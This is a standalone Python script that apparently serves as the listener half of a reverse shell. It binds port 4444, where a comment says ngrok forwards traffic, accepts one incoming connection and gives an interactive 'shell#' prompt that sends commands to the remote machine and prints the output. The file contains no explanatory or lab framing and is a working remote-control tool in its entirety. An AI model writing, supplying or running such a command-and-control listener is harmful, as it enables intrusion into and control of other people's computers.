import socket

HOST = '0.0.0.0'
PORT = 4444  # Must match local port that ngrok is forwarding
BUFFER_SIZE = 4096

def run_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[*] Listening on {HOST}:{PORT}...")

        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        with client:
            while True:
                cmd = input(f"* shell#{addr[0]}~$: ").strip()
                if not cmd:
                    continue
                client.sendall(cmd.encode())

                if cmd.lower() in ("exit", "q"):
                    print("[*] Closing connection...")
                    break

                response = b''
                while True:
                    chunk = client.recv(BUFFER_SIZE)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < BUFFER_SIZE:
                        break

                print(response.decode(errors="ignore"))

if __name__ == "__main__":
    run_listener()
